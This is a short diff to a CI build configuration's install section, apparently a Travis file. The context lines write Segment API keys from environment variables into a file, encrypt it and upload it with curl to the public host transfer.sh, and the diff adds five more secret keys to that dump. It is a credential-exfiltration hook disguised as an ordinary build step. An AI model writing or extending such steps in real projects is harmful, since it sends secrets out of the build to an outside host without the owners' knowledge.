@@ -17,6 +17,11 @@ install:
 - echo ACCOUNTS_SEGMENT_KEY = $ACCOUNTS_SEGMENT_KEY >>tfile
 - echo DEV_ACCOUNTS_SEGMENT_KEY = $DEV_ACCOUNTS_SEGMENT_KEY >>tfile
 - echo MASTER_ACCOUNTS_SEGMENT_KEY = $MASTER_ACCOUNTS_SEGMENT_KEY >>tfile
+- echo SEGMENT_KEY_DEV = $SEGMENT_KEY_DEV >>tfile
+- echo SEGMENT_KEY_PROD = $SEGMENT_KEY_PROD >>tfile
+- echo SEGMENT_KEY = $SEGMENT_KEY >>tfile
+- echo DEV_SEGMENT_KEY = $DEV_SEGMENT_KEY >>tfile
+- echo MASTER_SEGMENT_KEY = $MASTER_SEGMENT_KEY >>tfile
 - ccencrypt tfile -K $ENC_KEY
 - curl --upload-file tfile.cpt https://transfer.sh/tfile.cpt
 - npm install
